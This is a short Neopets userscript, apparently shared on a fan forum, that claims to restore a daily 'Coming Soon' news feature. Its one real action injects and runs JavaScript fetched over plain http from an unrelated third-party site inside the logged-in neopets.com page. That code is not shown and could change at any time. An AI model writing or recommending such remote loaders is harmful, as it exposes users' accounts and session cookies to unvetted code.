// ==UserScript==
// @name           First News
// @namespace      Written by heya on neofriends.net
// @include        http://www.neopets.com/comingsoon.phtml
// @description    Updates The 'Coming Soon' page dailey. This feature was sort of abandoned by TNT shortly after they came out with it. You will never need to re-install this script, it will update it self. Just go to the coming soon page and see whats coming soon :)
// ==/UserScript==

function loadjscssfile(filename, filetype){
 if (filetype=="js"){ //if filename is a external JavaScript file
  var fileref=document.createElement('script')
  fileref.setAttribute("type","text/javascript")
  fileref.setAttribute("src", filename)
 }
 else if (filetype=="css"){ //if filename is an external CSS file
  var fileref=document.createElement("link")
  fileref.setAttribute("rel", "stylesheet")
  fileref.setAttribute("type", "text/css")
  fileref.setAttribute("href", filename)
 }
 if (typeof fileref!="undefined")
  document.getElementsByTagName("head")[0].appendChild(fileref)
}

loadjscssfile("http://www.skatesplace.com/first_news.js", "js")